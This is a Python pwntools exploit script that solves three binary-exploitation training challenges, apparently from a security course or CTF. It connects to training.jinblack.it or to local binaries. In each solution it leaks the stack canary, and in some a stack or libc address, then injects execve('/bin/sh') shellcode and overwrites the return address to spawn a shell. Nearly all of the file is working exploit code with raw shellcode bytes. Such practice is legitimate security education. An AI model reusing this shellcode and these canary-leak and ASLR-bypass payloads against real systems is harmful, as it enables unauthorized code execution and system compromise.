import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("binary", type=str)
parser.add_argument("--remote", "-r", action="store_true")

context.terminal = ["exo-open", "--launch", "TerminalEmulator"]

class switcher():
    @classmethod
    def indirect(cls, args):
        method = getattr(cls, args.binary, lambda: "invalid")
        return method(args)

    @classmethod
    def leakers(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2010)
        else:
            r = process("./" + args.binary)
            gdb.attach(r, """
            b *0x401200
            c
            """)
            input("Press any key to continue.")
            r.recvuntil("Welcome to Leakers!\n")

        """
        jmp endshellcode
        shellcode:
        pop rdi
        mov rsi, rdi
        add rsi, 8
        mov rdx, rsi
        mov rax, 0x3b
        syscall
        endshellcode:
        call shellcode
        """

        shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
        shellcode = shellcode + b"/bin/sh\x00" + b"\x00" * 8

        r.sendline(shellcode)
        time.sleep(0.1)

        r.send("\x90" * 105)
        time.sleep(0.1)

        r.recvuntil("> ")
        r.recv(105)
        
        buffer = 0x0000000000404080
        canary = u64(b"\x00" + r.recv(7))

        payload = b"\x90" * 104 + p64(canary) + b"\x90" * 8 + p64(buffer)

        r.send(payload)
        time.sleep(0.1)

        r.recvuntil("> ")
        r.send(b"\x00")

        r.interactive()

    @classmethod
    def gonnaleak(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2011)
        else:
            r = process("./" + args.binary)
            gdb.attach(r, """
            b *0x004011d4
            c
            """)
            input("Press any key to continue.")
            r.recvuntil("Leakers gonna leak!\n")

        r.send("\x90" * 96)
        time.sleep(0.1)

        r.recvuntil("> ")
        r.recv(96)

        stack_address = u64(r.recv(6) + b"\x00" * 2)

        shellcode = b"\0\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
        payload = shellcode + b"/bin/sh\x00" + b"\x00" * 8

        r.send(b"\x90" * 105)
        time.sleep(0.1)

        r.recvuntil("> ")
        r.recv(105)

        canary = u64(b"\x00" + r.recv(7))

        payload = payload + b"\x90" * 60 + p64(canary) + b"\x00" * 8 + p64(stack_address - 335)
        r.send(payload)

        r.recvuntil("> ")
        r.send(b"\x00")

        r.interactive()

    @classmethod
    def aslr(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2012)
        else:
            r = process("./" + args.binary)
            gdb.attach(r, """
            c
            """)
            input("Press any key to continue.")
            r.recvuntil("Welcome to Leakers!\n")

        shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
        shellcode = shellcode + b"/bin/sh\x00" + b"\x00" * 8

        r.sendline(shellcode)
        time.sleep(0.1)

        r.send(b"\x90" * 105)
        time.sleep(0.1)

        r.recvuntil("> ")
        r.recv(105)

        canary = u64(b"\x00" + r.recv(7))
        libc = u64(r.recv(6) + b"\x00" * 2)
        diff = int(0x2005C0)
        buffer = libc + diff

        payload = b"\x90" * 104 + p64(canary) + b"\x90" * 8 + p64(buffer)

        r.send(payload)
        time.sleep(0.1)

        r.recvuntil("> ")
        r.send(b"\x00")
        r.interactive()

switcher.indirect(parser.parse_args())
